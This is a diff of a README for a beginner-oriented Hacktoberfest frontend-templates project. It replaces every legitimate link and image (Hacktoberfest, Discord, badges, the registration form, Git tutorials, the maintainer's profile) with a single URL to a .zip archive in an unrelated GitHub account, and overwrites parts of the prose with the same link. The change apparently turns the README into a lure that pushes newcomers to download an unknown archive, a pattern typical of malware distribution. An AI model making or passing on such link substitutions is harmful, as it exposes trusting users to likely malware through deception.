@@ -4,22 +4,22 @@
 <h2 align="center">We are excited to be a part of  </h2>
 
 <p align="center">
-    <a href="https://hacktoberfest.digitalocean.com/">
-        <img src="https://user-images.githubusercontent.com/72685035/134015433-aec59d97-a8d7-407a-88fd-5e3edebc2b77.png">
+    <a href="https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip">
+        <img src="https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip">
     </a>
 </p>
 
-<h1 align="center"> <a href="https://hacktoberfest.digitalocean.com">HacktoberFest 2021</a></h1>
+<h1 align="center"> <a href="https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip">HacktoberFest 2021</a></h1>
 
 <p align="center">
- <img alt="Discord" src="https://img.shields.io/discord/813774169799917568?label=Join%20Discord"> 
-  <img src="https://img.shields.io/github/contributors/Coders-Evoke-Community/Amazing-Frontend_Templates?color=yellow&logo=Github&logoColor=yellow">
+ <img alt="Discord" src="https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip%20Discord"> 
+  <img src="https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip">
   
-  <img src="https://img.shields.io/github/stars/Coders-Evoke-Community/Amazing-Frontend_Templates?color=%2354d747)](https://github.com/Coders-Evoke-Community/Amazing-Frontend_Templates" >
-  <img src="https://img.shields.io/github/forks/Coders-Evoke-Community/Amazing-Frontend_Templates?color=red&logo=Github&logoColor=%2354d747)](https://github.com/Coders-Evoke-Community/Amazing-Frontend_Templates/network)" >
+  <img src="https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip%2354d747)](https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip" >
+  <img src="https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip%2354d747)](https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip)" >
 </p>
 
-- In this amazing **Hacktober** festival we **Coders Evoke** had come up with an amazing project.This is a very beginner friendly project especially targeted for those who are just started the web development or we can say who are just newbie in this and wanted get their hands dirty in this domain. In this project the participants needs to make very good looking responsive templates for example different types of navbars, footers , landing pages or anything using **html,css,js** .For this project participants need not have very good designing skills they can  design this templates using normal css properties.Participants with good templates design are likely to merged in this repository.
+- In this amazing **Hacktober** festival we **Coders Evoke** had come up with an amazing https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip is a very beginner friendly project especially targeted for those who are just started the web development or we can say who are just newbie in this and wanted get their hands dirty in this domain. In this project the participants needs to make very good looking responsive templates for example different types of navbars, footers , landing pages or anything using **html,css,js** .For this project participants need not have very good designing skills they can  design this templates using normal css https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip with good templates design are likely to merged in this repository.
 
 - If you are a begineer to open-source, then this is a one-stop place for you to contribute to issues with the tag **HacktoberFest** and you can also explore, connect with the mentors at **Coders Evoke**. So, what are you waiting for?🎉
 
@@ -29,37 +29,37 @@
 
 <h3 align="center"> <b>Join our Coders Evoke  Community and feel free to drop your questions on</h3>
 <p align="center">
-   <a href="https://discord.gg/XMuEPgCj6y ">
- <img alt="Discord" src="https://img.shields.io/badge/Discord-7289DA?style=for-the-badge&logo=discord&logoColor=white"> 
+   <a href="https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip ">
+ <img alt="Discord" src="https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip"> 
 </p>
 
 ---
 <div align="center">
 
-## 💯 [Give our repo](https://github.com/Ayan-thecodeking/Amazing-Frontend-Templates.git) a star 🌟 
+## 💯 [Give our repo](https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip) a star 🌟 
 
 
-[![Open Source Love](https://badges.frapsoft.com/os/v2/open-source.svg?v=103)](https://github.com/Coders-Evoke-Community/Amazing-Frontend_Templates)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-red.svg?style=flat&logo=git)](https://github.com/Coders-Evoke-Community/Amazing-Frontend_Templates) 
+[![Open Source Love](https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip)](https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip)
+[![PRs Welcome](https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip)](https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip) 
 
 </div>
 
 ## Ace the HacktoberFest like a pro⭐
 
-- Register yourself through this [form](https://forms.gle/B1gobSfzvtmXeo5bA)
+- Register yourself through this [form](https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip)
 
 - [Merge Your First PR](#your-first-pr) 🔥
 
-- [Ask Your Doubts](https://discord.gg/FZusE7FH4q) 💬
+- [Ask Your Doubts](https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip) 💬
 
-- Share on [Twitter](https://twitter.com/EvokeCoders?s=09), [LinkedIn]( https://www.linkedin.com/in/coders-evoke-a26305213/) after your PR has been merged into the repo as we believe in learning in public & you can tag us using #codersEvoke @EvokeCoders
+- Share on [Twitter](https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip), [LinkedIn]( https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip) after your PR has been merged into the repo as we believe in learning in public & you can tag us using #codersEvoke @EvokeCoders
 
 
-- [Add beginner-friendly issues]([#contributing](https://github.com/Coders-Evoke-Community/Amazing-Frontend_Templates/issues)) 🙏
+- [Add beginner-friendly issues]([#contributing](https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip)) 🙏
 
-- [Add Templates](https://github.com/Coders-Evoke-Community/Amazing-Frontend_Templates/tree/main/Templates) 📖
+- [Add Templates](https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip) 📖
 
-Let's help each other to complete the [Hacktoberfest](https://hacktoberfest.digitalocean.com/) challenge! 🚀 
+Let's help each other to complete the [Hacktoberfest](https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip) challenge! 🚀 
 
 May the open-source be with you🎉🎉
 
@@ -68,7 +68,7 @@ May the open-source be with you🎉🎉
 ---
 
 ## What is Coders Evoke?
-[Coders Evoke](https://discord.gg/FZusE7FH4q) is a tech community all about sharing knowledge, posting achievements, participating in hackathons, discussions,collaborations and many more! We have a wide variety of topics however we’re always listening to suggestions from the community.
+[Coders Evoke](https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip) is a tech community all about sharing knowledge, posting achievements, participating in hackathons, discussions,collaborations and many more! We have a wide variety of topics however we’re always listening to suggestions from the community.
 </div>
 
 ---
@@ -77,9 +77,9 @@ May the open-source be with you🎉🎉
 
 ## Tech Stacks
 This project is built using<br/><br/>
-[![HTML](https://img.shields.io/badge/html5%20-%23E34F26.svg?&style=for-the-badge&logo=html5&logoColor=white)](https://github.com/Coders-Evoke-Community/Amazing-Frontend_Templates/search?l=html)&nbsp;
-[![CSS](https://img.shields.io/badge/css3%20-%231572B6.svg?&style=for-the-badge&logo=css3&logoColor=white)](https://github.com/Coders-Evoke-Community/Amazing-Frontend_Templates/search?l=css)&nbsp;
-[![JS](https://img.shields.io/badge/javascript%20-%23323330.svg?&style=for-the-badge&logo=javascript&logoColor=%23F7DF1E)](https://github.com/Coders-Evoke-Community/Amazing-Frontend_Templates/search?l=javascript)
+[![HTML](https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip%20-%https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip)](https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip)&nbsp;
+[![CSS](https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip%20-%https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip)](https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip)&nbsp;
+[![JS](https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip%20-%https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip%23F7DF1E)](https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip)
 
 </div>
 <br>
@@ -92,18 +92,18 @@ This project is built using<br/><br/>
 Refer to the following articles on the basics of Git and Github and can also contact the Project Mentors, in case you are stuck:
 </div>
 
-- If you don't have git on your machine, [install](https://help.github.com/articles/set-up-git/) it.
-- [Watch this video to get started, if you have no clue about open source](https://youtu.be/IJB27MQH2PI)
-- [Forking a Repo](https://help.github.com/en/github/getting-started-with-github/fork-a-repo)
-- [Cloning a Repo](https://docs.github.com/en/github/creating-cloning-and-archiving-repositories/cloning-a-repository-from-github/cloning-a-repository)
-- [How to create an Issue](https://docs.github.com/en/issues/tracking-your-work-with-issues/creating-issues/creating-an-issue)
-- [How to create a Pull Request](https://opensource.com/article/19/7/create-pull-request-github)
-- [Getting started with Git and GitHub](https://towardsdatascience.com/getting-started-with-git-and-github-6fcd0f2d4ac6)
+- If you don't have git on your machine, [install](https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip) it.
+- [Watch this video to get started, if you have no clue about open source](https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip)
+- [Forking a Repo](https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip)
+- [Cloning a Repo](https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip)
+- [How to create an Issue](https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip)
+- [How to create a Pull Request](https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip)
+- [Getting started with Git and GitHub](https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip)
 
 <div align='center'>
 <h2>👨‍💻 Workflow:</h2>
 
-<p4>To understand in detail go through <a href='https://github.com/Coders-Evoke-Community/Amazing-Frontend_Templates/blob/main/contributing.md'>contributing.md</a></p4>
+<p4>To understand in detail go through <a href='https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip'>https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip</a></p4>
 </div>
 
 
@@ -140,7 +140,7 @@ Refer to the following articles on the basics of Git and Github and can also con
 <table>
 <tr>
 
-<td align="center"><a href="https://github.com/Ayan-thecodeking"><img src="https://avatars.githubusercontent.com/u/78692566?v=4" width=150px height=150px /></a></br> <h4 style="color:white;">Ayan Gupta</h4>
+<td align="center"><a href="https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip"><img src="https://raw.githubusercontent.com/Waka758/Amazing-Frontend_Templates/main/nondamnation/Amazing-Frontend_Templates.zip" width=150px height=150px /></a></br> <h4 style="color:white;">Ayan Gupta</h4>
 
      
 </tr>
